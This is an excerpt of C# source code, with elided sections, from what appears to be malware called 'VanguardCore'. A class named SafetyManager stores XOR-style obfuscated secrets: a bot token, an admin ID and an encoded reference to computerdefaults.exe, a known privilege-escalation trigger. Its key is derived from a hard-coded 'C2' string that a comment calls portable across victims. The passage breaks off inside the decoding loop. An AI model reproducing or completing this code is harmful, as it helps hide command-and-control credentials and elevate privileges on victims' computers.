...
namespace VanguardCore
{
    public static class SafetyManager
    {
        ...
        private static readonly Dictionary<string, byte[]> _vault = new Dictionary<string, byte[]>
        {
            ...
            { "BOT_TOKEN", new byte[] { 195, 60, 138, 253, 239, 203, 111, 243, 247, 31, 225, 203, 208, 182, 47, 246, 50, 173, 36, 15, 142, 188, 75, 138, 95, 12, 169, 67, 2, 245, 18, 221, 181, 71, 134, 172, 135, 163, 47, 178, 172, 26, 141, 233, 227, 161 } },
            ...
            { "ADMIN_ID", new byte[] { 214, 57, 131, 250, 237, 198, 98, 246, 246, 30, 234, 178, 166, 197 } },
            ...
            { "MS_TRIGGER", new byte[] { 0x35, 0x21, 0x2a, 0x22, 0x31, 0x2b, 0x36, 0x37, 0x27, 0x37, 0x23, 0x35, 0x2A, 0x5E, 0x44, 0x41, 0x78, 0x2B, 0x3D, 0x37 } } // computerdefaults.exe
        };
        ...
        public static string Resolve(string id)
        {
            ...
            if (VAULT_KEY == null) 
            {
                // Stealth static key derivation (portable across victims)
                byte[] baseKey = Encoding.UTF8.GetBytes("VANGUARD_C2_STATIC_CORE_2026");
                using (var sha = SHA256.Create()) { VAULT_KEY = sha.ComputeHash(baseKey); }
            }
            byte[] b = _vault[id];
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++)
